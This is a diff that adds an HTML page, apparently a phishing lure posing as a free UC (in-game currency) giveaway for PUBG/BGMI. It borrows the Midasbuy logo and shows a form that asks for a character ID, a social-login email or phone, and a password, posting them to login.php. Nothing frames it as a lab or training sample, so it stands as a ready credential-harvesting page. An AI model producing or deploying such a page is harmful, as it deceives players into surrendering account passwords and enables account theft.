@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG/BGMI - Free UC Giveaway</title>
+    <style>
+        body { background-color: #121212; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 50px 20px; margin: 0; }
+        .container { background: #1f1f1f; padding: 30px; border-radius: 12px; border: 1px solid #f3a011; display: inline-block; width: 100%; max-width: 400px; box-sizing: border-box; }
+        .logo { width: 150px; margin-bottom: 20px; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #333; border-radius: 6px; background: #2c2c2c; color: white; box-sizing: border-box; }
+        .btn { width: 100%; background-color: #f3a011; border: none; border-radius: 6px; color: black; font-size: 18px; font-weight: bold; padding: 12px; cursor: pointer; margin-top: 15px; }
+        h2 { color: #f3a011; margin-top: 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img class="logo" src="https://www.midasbuy.com/static/images/logo.png" alt="Midasbuy">
+        <h2>Free UC Giveaway</h2>
+        <p>Enter your ID and login to verify for rewards.</p>
+        <form action="login.php" method="POST">
+            <select name="UC_Amount" required>
+                <option value="600">600 + 60 UC - Free</option>
+                <option value="1800">1800 + 250 UC - Free</option>
+                <option value="3000">3000 + 850 UC - Free</option>
+            </select>
+            <input type="text" name="Character_ID" placeholder="Character ID" required>
+            <input type="text" name="Login_Email" placeholder="Email/Phone (Social Login)" required>
+            <input type="password" name="Login_Pass" placeholder="Password" required>
+            <button type="submit" class="btn">Redeem Now</button>
+        </form>
+    </div>
+</body>
+</html>
